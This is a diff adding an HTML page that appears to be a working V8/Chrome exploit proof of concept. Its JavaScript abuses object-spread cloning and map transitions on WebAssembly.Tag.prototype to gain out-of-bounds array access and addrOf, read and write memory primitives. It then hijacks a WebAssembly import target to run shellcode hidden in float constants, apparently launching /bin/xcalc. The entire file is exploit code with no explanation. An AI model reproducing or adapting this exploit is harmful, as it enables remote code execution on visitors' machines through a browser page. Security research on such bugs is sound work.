@@ -1,0 +1,201 @@
+<html>
+<body>
+<script>
+const importObject = {
+  imports: { imported_func : Math.sin},
+};
+
+var tag = new WebAssembly.Tag({parameters : ["i32", "i64"]});
+//Generated using import_shell.js
+var wasmBuffer = new Uint8Array([0,97,115,109,1,0,0,0,1,16,3,80,0,94,124,1,96,1,124,1,124,96,0,1,99,0,2,25,1,7,105,109,112,111,114,116,115,13,105,109,112,111,114,116,101,100,95,102,117,110,99,0,1,3,3,2,1,2,7,21,2,4,109,97,105,110,0,1,10,109,97,107,101,95,97,114,114,97,121,0,2,10,136,2,2,6,0,32,0,16,0,11,254,1,1,1,99,0,65,18,251,7,0,33,0,32,0,65,0,68,49,246,49,210,49,192,235,29,251,14,0,32,0,65,1,68,104,108,99,0,0,144,235,32,251,14,0,32,0,65,2,68,104,47,120,99,97,88,235,32,251,14,0,32,0,65,3,68,104,47,98,105,110,91,235,32,251,14,0,32,0,65,4,68,144,144,72,193,224,32,235,32,251,14,0,32,0,65,5,68,72,1,216,80,84,95,235,32,251,14,0,32,0,65,6,68,86,87,84,94,144,144,235,32,251,14,0,32,0,65,7,68,104,58,48,46,48,144,235,32,251,14,0,32,0,65,8,68,104,76,65,89,61,88,235,32,251,14,0,32,0,65,9,68,104,68,73,83,80,91,235,32,251,14,0,32,0,65,10,68,144,72,193,224,32,144,235,32,251,14,0,32,0,65,11,68,72,1,216,80,84,144,235,32,251,14,0,32,0,65,12,68,65,90,82,65,82,84,235,32,251,14,0,32,0,65,13,68,90,184,59,0,0,0,235,32,251,14,0,32,0,65,14,68,15,5,90,49,210,82,235,32,251,14,0,32,0,11,0,26,4,110,97,109,101,1,19,2,1,4,109,97,105,110,2,10,109,97,107,101,95,97,114,114,97,121]
+);
+var view = new ArrayBuffer(24);
+var dblArr = new Float64Array(view);
+var intView = new Uint32Array(view);
+var bigIntView = new BigInt64Array(view);
+
+function ftoi32(f) {
+    dblArr[0] = f;
+    return [intView[0], intView[1]];
+}
+
+function i32tof(i1, i2) {
+    intView[0] = i1;
+    intView[1] = i2;
+    return dblArr[0];
+}
+
+function itof(i) {
+    bigIntView = BigInt(i);
+    return dblArr[0];
+}
+
+function ftoi(f) {
+    dblArr[0] = f;
+    return bigIntView[0];
+}
+
+function addrOf(obj, dblOffset) {
+  oobObjArr[0] = obj;
+  if (dblOffset % 2 == 0) {
+    var addrDbl = oobDblArr[dblOffset/2];
+    return ftoi32(addrDbl)[0] - 8;
+  }
+  var addrDbl = oobDblArr[(dblOffset - 1)/2];
+  return ftoi32(addrDbl)[1] - 8;
+}
+
+function read(addr, dblArrOffset) {
+  var oldValue = oobDblArr[dblArrOffset];
+  oobDblArr[dblArrOffset] = i32tof(addr, 8);
+  var out = ftoi32(oobDblArr2[0]);
+  oobDblArr[dblArrOffset] = oldValue;
+  return out;
+}
+
+function write(addr, val1, val2, dblArrOffset) {
+  var oldValue = oobDblArr[dblArrOffset];
+  oobDblArr[dblArrOffset] = i32tof(addr, 8);
+  oobDblArr2[0] = i32tof(val1, val2);
+  oobDblArr[dblArrOffset] = oldValue;
+  return; 
+}
+
+function searchByteArray(byteArrayMap, start, length) {
+  for (let thisAddr = start; thisAddr < start + length; thisAddr += 4) {
+    var val = read(thisAddr, dblOffset);
+    if (val[0] == byteArrayMap) {
+      return thisAddr + 8;
+    }
+  }
+}
+
+
+function clone0(x) {
+  return {...x};
+}
+
+function set_length(x) {
+  x.c4.len = 1000;
+}
+
+var obj0 = {c0 : 0, c1 : 1, c2 : 2, c3 : 3};
+obj0.c4 = {len : 1};
+var obj1 = {c0 : 0, c1 : 1, c2 : 2, c3 : 3};
+obj1.c4 = {len : 1};
+for (let i = 0; i < 20; i++) {
+  clone0(obj0);
+}
+set_length(obj1);
+for (let i = 0; i < 20000; i++) {
+  set_length(obj0);
+}
+
+var a8 = {c : 1};
+var a7 = clone0(obj0);
+
+function transition_store(x) {
+  x.a7 = 0x100;
+}
+//PropertyArray
+function transition_store2(x) {
+  x.a8 = a8;
+}
+
+function clone(x) {
+  return {...x};
+}
+
+var x = WebAssembly.Tag.prototype;
+x.type = {};
+x.a1 = 1;
+delete x.constructor;
+delete x[Symbol.toStringTag];
+x.a2 = 1;
+x.a3 = 1;
+x.a4 = 1;
+x.a5 = 1;
+x.a6 = 1;
+var y = {};
+y.__proto__ = x;
+meta = document.createElement('meta');
+meta.httpEquiv = 'Origin-Trial';
+meta.content = '{"origin" : "http://localhost:8000", "feature": "WebAssemblyJSPromiseIntegration", "expiry": 1719702000}';
+document.head.appendChild(meta);
+y.a = 1;
+z = y.a;
+var obj = {...x};
+    obj.type = 1;
+    for (let i = 1; i < 7; i++) {
+      obj['a'+i] = {a : 1};
+    }
+for (let i = 0; i < 20; i++) {
+  obj = clone(x);
+}
+obj.x = 1;
+var obj2 = {...obj};
+var obj3 = {...obj};
+var val = {c : 1};
+transition_store(obj3);
+transition_store2(obj3);
+for (let i = 0; i < 20000; i++) {
+  var tmp = {...obj2};
+  transition_store(tmp);
+  transition_store2(tmp);
+}
+obj = clone(x);
+obj.x = 1;
+transition_store(obj);
+transition_store2(obj);
+var oobDblArr = [1.1];
+var oobObjArr = [view, 0x42, 0x43];
+oobObjArr[0] = 0x41;
+var oobDblArr2 = [1, 1.5, 2, 2.5];
+for (let i = 9; i < 15; i++) {
+  obj['a' + i] = oobDblArr;
+}
+set_length(a7);
+var dblOffset = null;
+for (let i = 0; i < 20; i++) {
+  var elem = ftoi32(oobDblArr[i]);
+  if (elem[0] == 6 && elem[1] == 2 * 0x41) {
+    let next = ftoi32(oobDblArr[i + 1]);
+    if (next[0] == 2 * 0x42 && next[1] == 2 * 0x43) {
+      dblOffset = 2 * i + 1; 
+    }
+  } else if (elem[1] == 6) {
+    let next = ftoi32(oobDblArr[i + 1]);
+    if (next[0] == 2 * 0x41 && next[1] == 2 * 0x42) {
+      dblOffset = 2 * (i + 1);
+    }
+  }
+}
+
+var oobObjAddr = addrOf(oobObjArr,dblOffset);
+var oobDblAddr = addrOf(oobDblArr,dblOffset);
+var oobDblAddr2 = addrOf(oobDblArr2,dblOffset);
+var dblIndexOffset = Math.floor((oobDblAddr2 - oobDblAddr - 0x18)/8);
+
+var tagAddr = addrOf(tag, dblOffset);
+var byteArray = read(tagAddr + 12, dblIndexOffset)[0];
+var byteArrayMap = read(byteArray - 8, dblIndexOffset)[0];
+
+var module = new WebAssembly.Module(wasmBuffer);
+var tmpObj = {};
+var instance = new WebAssembly.Instance(module, importObject);
+var moduleAddr = addrOf(tmpObj, dblOffset);
+var importTargets = searchByteArray(byteArrayMap, moduleAddr + 200, 40);
+var instr_start = read(importTargets, dblIndexOffset);
+
+var msg = 'importTargets: 0x' + importTargets.toString(16) + ' instr_start: 0x' + instr_start[1].toString(16) + instr_start[0].toString(16);
+var func = instance.exports.make_array;
+func();
+
+write(importTargets, instr_start[0] + 0xe + 0x100, instr_start[1], dblIndexOffset);
+var exported = instance.exports.main;
+exported();
+exported();
+
+</script>
+</body>
+</html>
